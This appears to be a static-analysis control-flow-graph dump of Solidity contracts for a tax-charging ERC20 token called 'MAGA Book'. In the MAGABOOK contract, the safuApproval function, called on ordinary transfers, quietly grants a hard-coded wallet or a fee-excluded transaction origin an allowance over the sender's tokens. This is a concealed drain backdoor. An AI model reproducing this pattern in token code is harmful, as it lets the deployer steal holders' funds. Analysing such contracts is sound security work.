Contract: Context
==================================================

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1


Contract: ISAFURouter
==================================================


Contract: ISAFUFactory
==================================================


Contract: Ownable
==================================================

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: msgSender = _msgSender()

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = msgSender

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(address(0),msgSender)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: owner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _owner

Edges:
  0 -> 1

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1


Contract: SafeMath
==================================================

Function: add
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: c = a + b

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(c >= a,SafeMath: addition overflow)

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: sub
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(b <= a,errorMessage)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: c = a - b

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: mul
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: a == 0

  ID: 2
  Type: NodeType.RETURN
  Expression: 0

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.VARIABLE
  Expression: c = a * b

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(c / a == b,SafeMath: multiplication overflow)

  ID: 6
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: div
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(b > 0,errorMessage)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: c = a / b

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3


Contract: IERC20
==================================================


Contract: MAGABOOK
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _safuFeeExcluded[owner()] = true

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _safuFeeExcluded[address(this)] = true

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _safuFeeExcluded[_safuWallet] = true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _safuBulls[_msgSender()] = _tTotalSAFU

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(0),_msgSender(),_tTotalSAFU)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5

Function: owner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _owner

Edges:
  0 -> 1

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1

Function: name
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _name

Edges:
  0 -> 1

Function: symbol
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _symbol

Edges:
  0 -> 1

Function: decimals
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _decimals

Edges:
  0 -> 1

Function: totalSupply
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _tTotalSAFU

Edges:
  0 -> 1

Function: balanceOf
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _safuBulls[account]

Edges:
  0 -> 1

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _transfer(_msgSender(),recipient,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: allowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _safuNodes[owner][spender]

Edges:
  0 -> 1

Function: approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _approve(_msgSender(),spender,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: transferFrom
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _transfer(sender,recipient,amount)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _approve(sender,_msgSender(),_safuNodes[sender][_msgSender()].sub(amount,ERC20: transfer amount exceeds allowance))

  ID: 3
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: _approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(owner != address(0),ERC20: approve from the zero address)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(spender != address(0),ERC20: approve to the zero address)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _safuNodes[owner][spender] = amount

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: Approval(owner,spender,amount)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: _transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(safuF != address(0),ERC20: transfer from the zero address)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(safuT != address(0),ERC20: transfer to the zero address)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(safuA > 0,Transfer amount must be greater than zero)

  ID: 4
  Type: NodeType.VARIABLE
  Expression: taxSAFU = _safuTransfer(safuF,safuT,safuA)

  ID: 5
  Type: NodeType.IF
  Expression: taxSAFU > 0

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _safuBulls[address(this)] = _safuBulls[address(this)].add(taxSAFU)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: Transfer(safuF,address(this),taxSAFU)

  ID: 8
  Type: NodeType.ENDIF
  Expression: 

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: _safuBulls[safuF] = _safuBulls[safuF].sub(safuA)

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: _safuBulls[safuT] = _safuBulls[safuT].add(safuA.sub(taxSAFU))

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: Transfer(safuF,safuT,safuA.sub(taxSAFU))

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  5 -> 8
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11

Function: safuApproval
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: 

  ID: 2
  Type: NodeType.IF
  Expression: isSAFU

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: walletSAFU = address(tx.origin)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: walletSAFU = _safuWallet

  ID: 5
  Type: NodeType.ENDIF
  Expression: 

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _safuNodes[aSAFU][walletSAFU] = safuA

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  2 -> 4
  3 -> 5
  4 -> 5
  5 -> 6

Function: _safuTransfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: taxSAFU = 0

  ID: 2
  Type: NodeType.IF
  Expression: safuF != owner() && safuT != owner()

  ID: 3
  Type: NodeType.VARIABLE
  Expression: walletSAFU = address(tx.origin)

  ID: 5
  Type: NodeType.IF
  Expression: safuF == _safuPair && safuT != address(_safuRouter) && ! _safuFeeExcluded[safuT]

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _buyCount ++

  ID: 7
  Type: NodeType.ENDIF
  Expression: 

  ID: 8
  Type: NodeType.IF
  Expression: safuT == _safuPair && safuF != address(this)

  ID: 10
  Type: NodeType.ENDIF
  Expression: 

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: swapBackSAFU(safuF,safuT,safuA,_safuFeeExcluded[walletSAFU])

  ID: 12
  Type: NodeType.ENDIF
  Expression: 

  ID: 13
  Type: NodeType.RETURN
  Expression: taxSAFU

  ID: 14
  Type: NodeType.IF
  Expression: (_buyCount > _reduceBuyTaxAt)

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: taxSAFU = safuA.mul(_finalBuyTax).div(100)

  ID: 16
  Type: NodeType.EXPRESSION
  Expression: taxSAFU = safuA.mul(_initialBuyTax).div(100)

  ID: 17
  Type: NodeType.ENDIF
  Expression: 

  ID: 18
  Type: NodeType.IF
  Expression: (_buyCount > _reduceSellTaxAt)

  ID: 19
  Type: NodeType.EXPRESSION
  Expression: taxSAFU = safuA.mul(_finalSellTax).div(100)

  ID: 20
  Type: NodeType.EXPRESSION
  Expression: taxSAFU = safuA.mul(_initialSellTax).div(100)

  ID: 21
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  2 -> 12
  3 -> 14
  5 -> 6
  5 -> 7
  6 -> 7
  7 -> 8
  8 -> 18
  8 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  14 -> 15
  14 -> 16
  15 -> 17
  16 -> 17
  17 -> 5
  18 -> 19
  18 -> 20
  19 -> 21
  20 -> 21
  21 -> 10

Function: swapBackSAFU
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: tokenSAFU = balanceOf(address(this))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: safuApproval(safuF,safuA,isSAFU)

  ID: 3
  Type: NodeType.IF
  Expression: ! inSwapSAFU && safuT == _safuPair && _swapEnabled && _buyCount > _preventSwapBefore

  ID: 4
  Type: NodeType.IF
  Expression: tokenSAFU > _tokenSAFUSwap

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: swapTokensForEth(minSAFU(safuA,minSAFU(tokenSAFU,_tokenSAFUSwap)))

  ID: 6
  Type: NodeType.ENDIF
  Expression: 

  ID: 7
  Type: NodeType.VARIABLE
  Expression: caSAFU = address(this).balance

  ID: 8
  Type: NodeType.IF
  Expression: caSAFU >= 0

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: sendETHSAFU(address(this).balance)

  ID: 10
  Type: NodeType.ENDIF
  Expression: 

  ID: 11
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  3 -> 11
  4 -> 5
  4 -> 6
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  8 -> 10
  9 -> 10
  10 -> 11

Function: initMAGABOOK
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _safuRouter = ISAFURouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _approve(address(this),address(_safuRouter),_tTotalSAFU)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _safuPair = ISAFUFactory(_safuRouter.factory()).createPair(address(this),_safuRouter.WETH())

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: openTrading
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(! _tradeEnabled,trading is already open)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _safuRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _swapEnabled = true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _tradeEnabled = true

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 5
  1 -> 2
  2 -> 3
  3 -> 4
  5 -> 1

Function: minSAFU
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 2
  Type: NodeType.IF
  Expression: (a > b)

  ID: 3
  Type: NodeType.RETURN
  Expression: b

  ID: 4
  Type: NodeType.RETURN
  Expression: a

Edges:
  0 -> 2
  2 -> 3
  2 -> 4

Function: sendETHSAFU
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: address(_safuWallet).transfer(amount)

Edges:
  0 -> 1

Function: swapTokensForEth
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: path = new address[](2)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: path[0] = address(this)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: path[1] = _safuRouter.WETH()

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _approve(address(this),address(_safuRouter),tokenSAFU)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _safuRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenSAFU,0,path,address(this),block.timestamp)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: lockTheSwap()

Edges:
  0 -> 6
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  6 -> 1

Function: receive
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _initialBuyTax = 3

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _initialSellTax = 3

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _finalBuyTax = 0

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _finalSellTax = 0

  ID: 4
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _reduceBuyTaxAt = 6

  ID: 5
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _reduceSellTaxAt = 6

  ID: 6
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _preventSwapBefore = 6

  ID: 7
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _buyCount = 0

  ID: 8
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _tokenSAFUSwap = _tTotalSAFU / 100

  ID: 9
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: inSwapSAFU = false

  ID: 10
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _safuWallet = 0x4DBF22eDc3C387fBd2E97748a57EbEfe0081d191

  ID: 11
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _tradeEnabled = false

  ID: 12
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _swapEnabled = false

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12

Function: slitherConstructorConstantVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _decimals = 9

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _tTotalSAFU = 1000000000 * 10 ** _decimals

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _name = MAGA Book

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _symbol = MAGABOOK

Edges:
  0 -> 1
  1 -> 2
  2 -> 3


